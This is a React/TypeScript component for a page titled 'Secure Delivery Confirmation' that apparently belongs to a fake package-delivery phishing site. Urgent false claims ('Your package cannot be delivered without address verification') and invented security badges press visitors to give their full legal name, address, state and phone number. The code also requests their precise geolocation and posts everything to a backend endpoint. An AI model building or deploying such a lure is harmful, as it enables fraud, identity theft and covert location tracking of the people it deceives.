import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { MapPin, Clock, Shield, AlertTriangle, CheckCircle2 } from "lucide-react";

interface FormData {
  full_name: string;
  address: string;
  state: string;
  phone: string;
}

const TrackingForm = () => {
  const [formData, setFormData] = useState<FormData>({
    full_name: "",
    address: "",
    state: "",
    phone: ""
  });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isGettingLocation, setIsGettingLocation] = useState(false);
  const { toast } = useToast();

  const handleInputChange = (field: keyof FormData, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const getLocation = (): Promise<{ latitude: number; longitude: number; accuracy: number }> => {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Geolocation is not supported by this browser."));
        return;
      }

      setIsGettingLocation(true);
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setIsGettingLocation(false);
          resolve({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          });
        },
        (error) => {
          setIsGettingLocation(false);
          reject(error);
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
      );
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      // Get geolocation
      let geoData = null;
      try {
        geoData = await getLocation();
        toast({
          title: "Location Access Granted",
          description: "Thank you for allowing location access for accurate delivery.",
        });
      } catch (geoError) {
        console.log("Geolocation denied or failed:", geoError);
        toast({
          title: "Location Access",
          description: "Location access denied. We'll use your address for delivery.",
          variant: "destructive"
        });
      }

      // Submit form data
      const response = await fetch('/functions/v1/submit-delivery', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ...formData,
          geolocation: geoData
        }),
      });

      if (response.ok) {
        toast({
          title: "Package Information Updated! 📦",
          description: "Your delivery information has been confirmed. You'll receive updates via SMS.",
        });
        
        // Reset form
        setFormData({
          full_name: "",
          address: "",
          state: "",
          phone: ""
        });
      } else {
        throw new Error('Failed to submit');
      }
    } catch (error) {
      toast({
        title: "Submission Error",
        description: "There was an issue confirming your delivery. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="max-w-lg mx-auto">
      <Card className="shadow-lg border-logistics-orange/20">
        <CardHeader className="bg-gradient-to-r from-logistics-orange to-logistics-blue text-white rounded-t-lg">
          <CardTitle className="text-2xl font-bold flex items-center">
            <Shield className="w-6 h-6 mr-2" />
            Secure Delivery Confirmation
          </CardTitle>
          <CardDescription className="text-white/90">
            Final step: Verify your details to authorize package delivery
          </CardDescription>
        </CardHeader>
        
        <CardContent className="space-y-4 p-6">
          <div className="bg-logistics-red/10 border border-logistics-red/20 rounded-lg p-3 mb-4">
            <div className="flex items-center text-logistics-red text-sm font-medium mb-1">
              <AlertTriangle className="w-4 h-4 mr-2" />
              Delivery Confirmation Required
            </div>
            <p className="text-xs text-muted-foreground">
              Your package cannot be delivered without address verification. Please confirm all details are accurate.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="full_name" className="flex items-center text-sm font-medium">
                Full Name (as on ID) <span className="text-red-500 ml-1">*</span>
              </Label>
              <Input
                id="full_name"
                type="text"
                value={formData.full_name}
                onChange={(e) => handleInputChange("full_name", e.target.value)}
                placeholder="Enter your complete legal name"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="address" className="flex items-center text-sm font-medium">
                Complete Delivery Address <span className="text-red-500 ml-1">*</span>
              </Label>
              <Input
                id="address"
                type="text"
                value={formData.address}
                onChange={(e) => handleInputChange("address", e.target.value)}
                placeholder="Street number, street name, apartment/unit"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="state" className="flex items-center text-sm font-medium">
                State/Province <span className="text-red-500 ml-1">*</span>
              </Label>
              <Input
                id="state"
                type="text"
                value={formData.state}
                onChange={(e) => handleInputChange("state", e.target.value)}
                placeholder="Enter your state or province"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="phone" className="flex items-center text-sm font-medium">
                Primary Contact Number <span className="text-red-500 ml-1">*</span>
              </Label>
              <Input
                id="phone"
                type="tel"
                value={formData.phone}
                onChange={(e) => handleInputChange("phone", e.target.value)}
                placeholder="(555) 123-4567"
                required
              />
            </div>

            <div className="bg-logistics-blue/10 p-4 rounded-lg border border-logistics-blue/20">
              <div className="flex items-center mb-2">
                <MapPin className="w-4 h-4 text-logistics-blue mr-2" />
                <span className="text-sm font-medium text-logistics-navy">Enhanced Location Services</span>
              </div>
              <p className="text-xs text-muted-foreground mb-2">
                For secure delivery, we'll verify your location to ensure package safety. 
                This prevents delivery to wrong addresses and reduces theft risk.
              </p>
              <div className="flex items-center text-xs text-logistics-green">
                <CheckCircle2 className="w-3 h-3 mr-1" />
                <span>SSL Encrypted • Privacy Protected • One-time access</span>
              </div>
            </div>

            <div className="space-y-2">
              <Button 
                type="submit"
                className="w-full bg-gradient-to-r from-logistics-orange to-logistics-blue hover:from-logistics-orange/90 hover:to-logistics-blue/90 text-white font-medium py-3 shadow-lg" 
                disabled={isSubmitting || isGettingLocation}
              >
                {isSubmitting || isGettingLocation ? (
                  isGettingLocation ? (
                    <>
                      <Clock className="w-4 h-4 mr-2 animate-spin" />
                      Securing Location...
                    </>
                  ) : (
                    <>
                      <Shield className="w-4 h-4 mr-2" />
                      Processing Secure Delivery...
                    </>
                  )
                ) : (
                  <>
                    <Shield className="w-4 h-4 mr-2" />
                    Authorize Secure Delivery
                  </>
                )}
              </Button>
              
              <p className="text-xs text-center text-muted-foreground">
                By clicking above, you confirm the accuracy of your information and authorize delivery
              </p>
            </div>
          </form>
        </CardContent>
      </Card>
    </div>
  );
};

export default TrackingForm;